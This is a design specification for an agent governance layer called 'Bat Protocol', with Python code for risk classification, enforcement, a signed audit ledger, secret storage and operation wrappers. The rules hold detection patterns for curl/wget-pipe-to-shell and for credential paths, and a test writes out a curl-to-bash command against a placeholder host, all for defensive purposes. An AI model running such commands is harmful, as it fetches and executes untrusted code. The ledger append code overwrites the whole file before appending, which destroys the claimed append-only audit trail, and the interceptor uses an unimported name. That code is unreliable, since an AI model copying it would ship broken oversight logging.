# Bat Protocol: Phase 1 — Foundation

> **Document Status:** CANONICAL  
> **Version:** 1.0.0  
> **Created:** 2026-02-24  
> **Edit Policy:** APPEND ONLY — Do not modify existing content. Add new sections via amendments.

---

## Phase Overview

**Duration:** Weeks 1-4  
**Goal:** Implement the core governance layer with deterministic risk classification.

**Prerequisites:** None (this is the first phase)

**Success State:** All agent operations flow through the proposal abstraction, risk classification is deterministic and testable, and the ledger provides tamper-evident audit.

---

## Deliverables Checklist

- [ ] `OperationProposal` schema (Python dataclass + JSON Schema)
- [ ] Risk engine with composable predicate rules
- [ ] Default-deny classification
- [ ] Enforcement engine with passive/enforce modes
- [ ] HMAC-signed append-only ledger
- [ ] `exec_command` wrapping with L3 classification
- [ ] Secret backend interface + system keyring implementation
- [ ] Fail-closed error handling throughout
- [ ] Policy testing framework
- [ ] 100% test coverage on risk engine and enforcement engine

---

## Component Specifications

### 1. OperationProposal Schema

**Location:** `src/alfred/bat/proposal.py`

```python
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Any
import uuid
import hashlib
import json

@dataclass
class OperationProposal:
    """Canonical representation of an agent's intended operation.

    All agent operations MUST be converted to this format before execution.
    The governance layer inspects proposals, not raw operations.
    """
    proposal_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    agent_id: str = ""
    operation_type: str = ""  # From standard taxonomy
    target: str = ""          # What the operation affects
    metadata: dict[str, Any] = field(default_factory=dict)
    content_hash: str = ""
    timestamp: datetime = field(default_factory=lambda: datetime.now(timezone.utc))

    def compute_hash(self) -> str:
        """Compute deterministic hash for this proposal."""
        data = json.dumps(asdict(self), sort_keys=True, default=str)
        return hashlib.sha256(data.encode()).hexdigest()

    def to_json(self) -> str:
        """Serialize to JSON for wire transmission."""
        return json.dumps(asdict(self), default=str)

    @classmethod
    def from_json(cls, json_str: str) -> "OperationProposal":
        """Deserialize from JSON."""
        data = json.loads(json_str)
        data["timestamp"] = datetime.fromisoformat(data["timestamp"])
        return cls(**data)
```

**JSON Schema:**

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "required": [
    "proposal_id",
    "agent_id",
    "operation_type",
    "target",
    "timestamp"
  ],
  "properties": {
    "proposal_id": { "type": "string", "format": "uuid" },
    "agent_id": { "type": "string" },
    "operation_type": { "type": "string" },
    "target": { "type": "string" },
    "metadata": { "type": "object" },
    "content_hash": { "type": "string" },
    "timestamp": { "type": "string", "format": "date-time" }
  }
}
```

### 2. Risk Engine

**Location:** `src/alfred/bat/risk.py`

```python
from dataclasses import dataclass
from enum import Enum
from typing import Callable, Optional
from .proposal import OperationProposal

class RiskLevel(Enum):
    L1 = "L1"  # Low risk - routine operations
    L2 = "L2"  # Medium risk - requires awareness
    L3 = "L3"  # High risk - sensitive operations

@dataclass
class RiskClassification:
    level: RiskLevel
    rule_id: str
    rationale: str

@dataclass
class RiskRule:
    id: str
    predicate: Callable[[OperationProposal], bool]
    level: RiskLevel
    rationale: str
    priority: int = 0

class RiskEngine:
    """Deterministic risk classification engine.

    NO LLM CALLS. Classification is a pure function.
    Default is L3 (deny) when no rule matches.
    """

    def __init__(self, rules: list[RiskRule]):
        # Sort by priority descending (highest priority first)
        self._rules = sorted(rules, key=lambda r: r.priority, reverse=True)

    def classify(self, proposal: OperationProposal) -> RiskClassification:
        """Classify a proposal. Returns L3 if no rule matches."""
        for rule in self._rules:
            try:
                if rule.predicate(proposal):
                    return RiskClassification(
                        level=rule.level,
                        rule_id=rule.id,
                        rationale=rule.rationale
                    )
            except Exception:
                # Rule evaluation failure → continue to next rule
                continue

        # DEFAULT DENY - no matching rule means highest risk
        return RiskClassification(
            level=RiskLevel.L3,
            rule_id="default-deny",
            rationale="No matching rule; default deny"
        )
```

### 3. Default Rules

**Location:** `src/alfred/bat/rules/default.py`

```python
from ..risk import RiskRule, RiskLevel
from ..proposal import OperationProposal
import re

# Sensitive path patterns
SENSITIVE_PATHS = [
    r"^/etc/.*",
    r"^~?/\.ssh/.*",
    r"^~?/\.gnupg/.*",
    r"^~?/\.aws/.*",
    r"\.env$",
    r"credentials",
    r"secret",
    r"\.pem$",
    r"\.key$",
]

# Remote code execution patterns
RCE_PATTERNS = [
    r"curl.*\|.*(?:bash|sh|python|perl|ruby)",
    r"wget.*\|.*(?:bash|sh|python|perl|ruby)",
    r"eval\s+",
    r"exec\s+",
]

def is_sensitive_path(path: str) -> bool:
    """Check if path matches sensitive patterns."""
    import os
    expanded = os.path.expanduser(path)
    for pattern in SENSITIVE_PATHS:
        if re.search(pattern, expanded, re.IGNORECASE):
            return True
    return False

def is_rce_command(command: str) -> bool:
    """Check if command matches RCE patterns."""
    for pattern in RCE_PATTERNS:
        if re.search(pattern, command, re.IGNORECASE):
            return True
    return False

DEFAULT_RULES = [
    # Block writes to sensitive paths
    RiskRule(
        id="sensitive-path-write",
        predicate=lambda p: p.operation_type == "write_file" and is_sensitive_path(p.target),
        level=RiskLevel.L3,
        rationale="Write to security-sensitive path",
        priority=100
    ),

    # Block remote code execution patterns
    RiskRule(
        id="rce-pattern",
        predicate=lambda p: (
            p.operation_type == "exec_command" and
            is_rce_command(p.metadata.get("command", ""))
        ),
        level=RiskLevel.L3,
        rationale="Remote code execution pattern detected",
        priority=100
    ),

    # All exec commands default to L3
    RiskRule(
        id="exec-default-l3",
        predicate=lambda p: p.operation_type == "exec_command",
        level=RiskLevel.L3,
        rationale="Command execution requires explicit allowlist",
        priority=50
    ),

    # Inbox writes are L1
    RiskRule(
        id="inbox-write-l1",
        predicate=lambda p: (
            p.operation_type == "write_file" and
            "inbox" in p.target.lower()
        ),
        level=RiskLevel.L1,
        rationale="Inbox write within normal operation",
        priority=10
    ),

    # Note creation is L1
    RiskRule(
        id="note-create-l1",
        predicate=lambda p: (
            p.operation_type == "write_file" and
            "note/" in p.target.lower()
        ),
        level=RiskLevel.L1,
        rationale="Note creation within normal operation",
        priority=10
    ),
]
```

### 4. Enforcement Engine

**Location:** `src/alfred/bat/enforcement.py`

```python
from dataclasses import dataclass
from datetime import datetime, timezone
from enum import Enum
from typing import Optional
from .proposal import OperationProposal
from .risk import RiskClassification, RiskLevel
from .ledger import GovernanceLedger

class Action(Enum):
    ALLOW = "allow"
    LOG = "log"
    REQUIRE_CONFIRMATION = "require_confirmation"
    BLOCK = "block"
    QUARANTINE = "quarantine"

@dataclass
class EnforcementDecision:
    proposal_id: str
    action: Action
    policy_version: str
    classification: RiskClassification
    timestamp: datetime
    rationale: str = ""

@dataclass
class EnforcementPolicy:
    """Maps risk levels to actions based on mode."""
    version: str
    mode: str  # "passive" | "enforce"

    def resolve_action(self, level: RiskLevel) -> Action:
        if self.mode == "passive":
            # Passive mode: log everything, block nothing
            return Action.LOG
        elif self.mode == "enforce":
            if level == RiskLevel.L1:
                return Action.ALLOW
            elif level == RiskLevel.L2:
                return Action.REQUIRE_CONFIRMATION
            else:  # L3
                return Action.BLOCK
        else:
            # Unknown mode → fail closed
            return Action.BLOCK

class EnforcementEngine:
    """Policy-driven enforcement with audit logging."""

    def __init__(self, policy: EnforcementPolicy, ledger: GovernanceLedger):
        self._policy = policy
        self._ledger = ledger

    def evaluate(
        self,
        proposal: OperationProposal,
        classification: RiskClassification
    ) -> EnforcementDecision:
        """Evaluate a proposal and record the decision."""
        action = self._policy.resolve_action(classification.level)

        decision = EnforcementDecision(
            proposal_id=proposal.proposal_id,
            action=action,
            policy_version=self._policy.version,
            classification=classification,
            timestamp=datetime.now(timezone.utc),
            rationale=classification.rationale
        )

        # Always log to ledger
        self._ledger.append(decision, proposal)

        return decision
```

### 5. Governance Ledger

**Location:** `src/alfred/bat/ledger.py`

```python
import hashlib
import hmac
import json
import os
import tempfile
from dataclasses import dataclass, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

@dataclass
class LedgerEntry:
    """Single entry in the governance ledger."""
    entry_id: str
    timestamp: datetime
    proposal: dict
    decision: dict
    previous_hash: str = ""
    hash: str = ""
    signature: str = ""

class GovernanceLedger:
    """HMAC-signed append-only audit ledger.

    CRITICAL: Ledger integrity is fundamental to governance.
    - Entries are cryptographically linked
    - Each entry is signed
    - Tampering is detectable
    """

    def __init__(self, path: Path, signing_key: bytes):
        self._path = Path(path)
        self._key = signing_key
        self._path.parent.mkdir(parents=True, exist_ok=True)
        self._last_hash = self._read_last_hash()

    def _read_last_hash(self) -> str:
        """Read the hash of the last entry."""
        if not self._path.exists():
            return "0" * 64  # Genesis

        try:
            with open(self._path, "r", encoding="utf-8") as f:
                for line in f:
                    pass  # Seek to last line
                entry = json.loads(line.strip())
                return entry.get("hash", "0" * 64)
        except (OSError, json.JSONDecodeError):
            return "0" * 64

    def _compute_hash(self, entry: dict) -> str:
        """Compute SHA-256 hash of entry."""
        data = json.dumps(entry, sort_keys=True, default=str)
        return hashlib.sha256(data.encode()).hexdigest()

    def _sign(self, data: str) -> str:
        """HMAC-SHA256 signature."""
        return hmac.new(self._key, data.encode(), hashlib.sha256).hexdigest()

    def append(self, decision, proposal) -> str:
        """Append a decision to the ledger. Returns entry hash.

        FAIL-CLOSED: Raises exception on write failure.
        """
        import uuid

        entry = {
            "entry_id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "proposal": asdict(proposal) if hasattr(proposal, '__dataclass_fields__') else proposal,
            "decision": asdict(decision) if hasattr(decision, '__dataclass_fields__') else decision,
            "previous_hash": self._last_hash,
        }

        # Compute hash chain
        entry["hash"] = self._compute_hash(entry)

        # Sign
        entry["signature"] = self._sign(entry["hash"])

        # Atomic write
        try:
            with tempfile.NamedTemporaryFile(
                dir=self._path.parent,
                delete=False,
                mode='w',
                encoding="utf-8",
                suffix=".tmp"
            ) as tmp:
                tmp.write(json.dumps(entry) + "\n")
                tmp.flush()
                os.fsync(tmp.fileno())
                tmp_path = tmp.name

            # Atomic replace
            os.replace(tmp_path, self._path)

            # Append mode for subsequent writes
            with open(self._path, "a", encoding="utf-8") as f:
                f.write(json.dumps(entry) + "\n")

            self._last_hash = entry["hash"]
            return entry["hash"]

        except OSError as e:
            # FAIL-CLOSED: Ledger write failure is critical
            raise LedgerWriteError(f"Failed to write to ledger: {e}")

    def verify(self) -> tuple[bool, list[str]]:
        """Verify ledger integrity. Returns (valid, errors)."""
        errors = []
        prev_hash = "0" * 64

        if not self._path.exists():
            return True, []

        try:
            with open(self._path, "r", encoding="utf-8") as f:
                for i, line in enumerate(f):
                    try:
                        entry = json.loads(line.strip())
                    except json.JSONDecodeError:
                        errors.append(f"Line {i+1}: Invalid JSON")
                        continue

                    # Verify hash chain
                    if entry.get("previous_hash") != prev_hash:
                        errors.append(f"Line {i+1}: Hash chain broken")

                    # Verify hash
                    expected_hash = self._compute_hash({k: v for k, v in entry.items() if k not in ("hash", "signature")})
                    if entry.get("hash") != expected_hash:
                        errors.append(f"Line {i+1}: Hash mismatch")

                    # Verify signature
                    expected_sig = self._sign(entry.get("hash", ""))
                    if entry.get("signature") != expected_sig:
                        errors.append(f"Line {i+1}: Signature invalid")

                    prev_hash = entry.get("hash", "")

        except OSError as e:
            errors.append(f"Read error: {e}")

        return len(errors) == 0, errors

class LedgerWriteError(Exception):
    """Raised when ledger write fails."""
    pass
```

### 6. Secret Backend

**Location:** `src/alfred/bat/secrets.py`

```python
from abc import ABC, abstractmethod
from typing import Optional
import os
import keyring

class SecretBackend(ABC):
    """Abstract interface for secret storage."""

    @abstractmethod
    def get(self, key: str) -> Optional[str]:
        """Retrieve a secret. Returns None if not found."""
        ...

    @abstractmethod
    def set(self, key: str, value: str) -> None:
        """Store a secret."""
        ...

    @abstractmethod
    def delete(self, key: str) -> None:
        """Delete a secret."""
        ...

    @abstractmethod
    def list_keys(self) -> list[str]:
        """List all stored secret keys."""
        ...

class KeyringBackend(SecretBackend):
    """System keyring backend using the keyring library."""

    SERVICE_NAME = "alfred-bat"

    def get(self, key: str) -> Optional[str]:
        try:
            return keyring.get_password(self.SERVICE_NAME, key)
        except keyring.errors.KeyringError:
            return None

    def set(self, key: str, value: str) -> None:
        try:
            keyring.set_password(self.SERVICE_NAME, key, value)
        except keyring.errors.KeyringError as e:
            raise SecretStorageError(f"Failed to store secret: {e}")

    def delete(self, key: str) -> None:
        try:
            keyring.delete_password(self.SERVICE_NAME, key)
        except keyring.errors.KeyringError:
            pass  # Already deleted or never existed

    def list_keys(self) -> list[str]:
        # keyring doesn't support listing; track separately
        return []

class EnvironmentBackend(SecretBackend):
    """Environment variable backend (for CI/CD)."""

    PREFIX = "BAT_SECRET_"

    def get(self, key: str) -> Optional[str]:
        return os.environ.get(f"{self.PREFIX}{key.upper()}")

    def set(self, key: str, value: str) -> None:
        # Environment variables are read-only in this backend
        raise SecretStorageError("Cannot set environment variables at runtime")

    def delete(self, key: str) -> None:
        raise SecretStorageError("Cannot delete environment variables at runtime")

    def list_keys(self) -> list[str]:
        return [
            k[len(self.PREFIX):].lower()
            for k in os.environ
            if k.startswith(self.PREFIX)
        ]

class SecretStorageError(Exception):
    """Raised when secret storage fails."""
    pass

def get_default_backend() -> SecretBackend:
    """Get the default secret backend based on environment."""
    # Prefer environment variables in CI
    if os.environ.get("CI") or os.environ.get("BAT_USE_ENV_SECRETS"):
        return EnvironmentBackend()

    # Default to system keyring
    return KeyringBackend()
```

### 7. Interceptor

**Location:** `src/alfred/bat/interceptor.py`

```python
from dataclasses import dataclass
from typing import Any, Callable, Optional
from pathlib import Path

from .proposal import OperationProposal
from .risk import RiskEngine, RiskClassification
from .enforcement import EnforcementEngine, EnforcementDecision, Action
from .ledger import GovernanceLedger

@dataclass
class InterceptResult:
    """Result of intercepting an operation."""
    allowed: bool
    decision: EnforcementDecision
    proposal: OperationProposal
    error: Optional[str] = None

class BatInterceptor:
    """Main interception point for all agent operations.

    This is the primary interface between agents and governance.
    """

    def __init__(
        self,
        risk_engine: RiskEngine,
        enforcement_engine: EnforcementEngine,
        ledger: GovernanceLedger,
    ):
        self._risk = risk_engine
        self._enforcement = enforcement_engine
        self._ledger = ledger

    def intercept(
        self,
        agent_id: str,
        operation_type: str,
        target: str,
        metadata: dict = None,
        content: str = "",
    ) -> InterceptResult:
        """Intercept an operation and determine if it should proceed.

        This is the main entry point for governance.
        """
        import hashlib

        # Create proposal
        proposal = OperationProposal(
            agent_id=agent_id,
            operation_type=operation_type,
            target=target,
            metadata=metadata or {},
            content_hash=hashlib.sha256(content.encode()).hexdigest() if content else "",
        )

        # Classify risk
        try:
            classification = self._risk.classify(proposal)
        except Exception as e:
            # FAIL-CLOSED: Classification failure → L3
            classification = RiskClassification(
                level=RiskLevel.L3,
                rule_id="classification-error",
                rationale=f"Classification failed: {e}"
            )

        # Evaluate enforcement
        try:
            decision = self._enforcement.evaluate(proposal, classification)
        except Exception as e:
            # FAIL-CLOSED: Enforcement failure → block
            return InterceptResult(
                allowed=False,
                decision=EnforcementDecision(
                    proposal_id=proposal.proposal_id,
                    action=Action.BLOCK,
                    policy_version="error",
                    classification=classification,
                    timestamp=proposal.timestamp,
                    rationale=f"Enforcement failed: {e}"
                ),
                proposal=proposal,
                error=str(e)
            )

        # Determine if allowed
        allowed = decision.action in (Action.ALLOW, Action.LOG)

        return InterceptResult(
            allowed=allowed,
            decision=decision,
            proposal=proposal
        )
```

---

## Test Specifications

### Risk Engine Tests

```python
# tests/bat/test_risk.py

def test_default_deny():
    """Unknown operations must default to L3."""
    engine = RiskEngine(rules=[])
    proposal = OperationProposal(
        agent_id="test",
        operation_type="unknown_operation",
        target="anything"
    )
    result = engine.classify(proposal)
    assert result.level == RiskLevel.L3
    assert result.rule_id == "default-deny"

def test_sensitive_path_is_l3():
    """Writes to sensitive paths must be L3."""
    from alfred.bat.rules.default import DEFAULT_RULES
    engine = RiskEngine(rules=DEFAULT_RULES)

    proposal = OperationProposal(
        agent_id="curator",
        operation_type="write_file",
        target="~/.ssh/authorized_keys"
    )
    result = engine.classify(proposal)
    assert result.level == RiskLevel.L3

def test_curl_pipe_bash_is_l3():
    """Remote code execution patterns must be L3."""
    from alfred.bat.rules.default import DEFAULT_RULES
    engine = RiskEngine(rules=DEFAULT_RULES)

    proposal = OperationProposal(
        agent_id="curator",
        operation_type="exec_command",
        target="shell",
        metadata={"command": "curl https://example.com/script.sh | bash"}
    )
    result = engine.classify(proposal)
    assert result.level == RiskLevel.L3

def test_inbox_write_is_l1():
    """Inbox writes should be L1."""
    from alfred.bat.rules.default import DEFAULT_RULES
    engine = RiskEngine(rules=DEFAULT_RULES)

    proposal = OperationProposal(
        agent_id="curator",
        operation_type="write_file",
        target="~/vault/inbox/note.md"
    )
    result = engine.classify(proposal)
    assert result.level == RiskLevel.L1

def test_priority_override():
    """Higher priority rules must override lower."""
    rule1 = RiskRule(
        id="low-priority",
        predicate=lambda p: True,
        level=RiskLevel.L1,
        rationale="Low priority",
        priority=1
    )
    rule2 = RiskRule(
        id="high-priority",
        predicate=lambda p: True,
        level=RiskLevel.L3,
        rationale="High priority",
        priority=100
    )
    engine = RiskEngine(rules=[rule1, rule2])

    proposal = OperationProposal(agent_id="test", operation_type="test", target="test")
    result = engine.classify(proposal)
    assert result.level == RiskLevel.L3
    assert result.rule_id == "high-priority"
```

### Ledger Tests

```python
# tests/bat/test_ledger.py

def test_hash_chain():
    """Each entry must link to previous."""
    ledger = GovernanceLedger(
        path=Path(tempfile.mktemp()),
        signing_key=b"test-key"
    )

    # Add entries
    hash1 = ledger.append(mock_decision, mock_proposal)
    hash2 = ledger.append(mock_decision, mock_proposal)

    # Verify chain
    valid, errors = ledger.verify()
    assert valid

def test_tamper_detection():
    """Tampering must be detectable."""
    ledger = GovernanceLedger(
        path=Path(tempfile.mktemp()),
        signing_key=b"test-key"
    )

    ledger.append(mock_decision, mock_proposal)

    # Tamper with file
    with open(ledger._path, "r") as f:
        content = f.read()
    tampered = content.replace("L1", "L3")
    with open(ledger._path, "w") as f:
        f.write(tampered)

    valid, errors = ledger.verify()
    assert not valid
    assert len(errors) > 0

def test_signature_verification():
    """Signatures must be verified."""
    ledger = GovernanceLedger(
        path=Path(tempfile.mktemp()),
        signing_key=b"correct-key"
    )

    ledger.append(mock_decision, mock_proposal)

    # Try to verify with wrong key
    wrong_key_ledger = GovernanceLedger(
        path=ledger._path,
        signing_key=b"wrong-key"
    )
    valid, errors = wrong_key_ledger.verify()
    assert not valid
```

---

## Integration Points

### Wrapping `subprocess.run`

```python
# src/alfred/bat/wrappers/subprocess.py

import subprocess
from typing import Any
from ..interceptor import BatInterceptor

def create_bat_subprocess_run(interceptor: BatInterceptor, agent_id: str):
    """Create a wrapped subprocess.run that goes through governance."""

    original_run = subprocess.run

    def bat_run(*args, **kwargs) -> subprocess.CompletedProcess:
        # Extract command
        if args:
            cmd = args[0]
        else:
            cmd = kwargs.get("args", [])

        # Build proposal
        result = interceptor.intercept(
            agent_id=agent_id,
            operation_type="exec_command",
            target="subprocess",
            metadata={"command": " ".join(cmd) if isinstance(cmd, list) else str(cmd)}
        )

        if not result.allowed:
            raise PermissionError(f"Operation blocked by Bat Protocol: {result.decision.rationale}")

        return original_run(*args, **kwargs)

    return bat_run
```

### Wrapping File Operations

```python
# src/alfred/bat/wrappers/filesystem.py

import builtins
from pathlib import Path
from ..interceptor import BatInterceptor

def create_bat_open(interceptor: BatInterceptor, agent_id: str):
    """Create a wrapped open() that goes through governance for writes."""

    original_open = builtins.open

    def bat_open(file, mode='r', *args, **kwargs):
        # Only intercept write modes
        if 'w' in mode or 'a' in mode or 'x' in mode:
            result = interceptor.intercept(
                agent_id=agent_id,
                operation_type="write_file",
                target=str(file),
                metadata={"mode": mode}
            )

            if not result.allowed:
                raise PermissionError(f"Operation blocked by Bat Protocol: {result.decision.rationale}")

        return original_open(file, mode, *args, **kwargs)

    return bat_open
```

---

## Amendment History

| Date       | Version | Amendment                     | Author          |
| ---------- | ------- | ----------------------------- | --------------- |
| 2026-02-24 | 1.0.0   | Initial Phase 1 specification | Security Review |
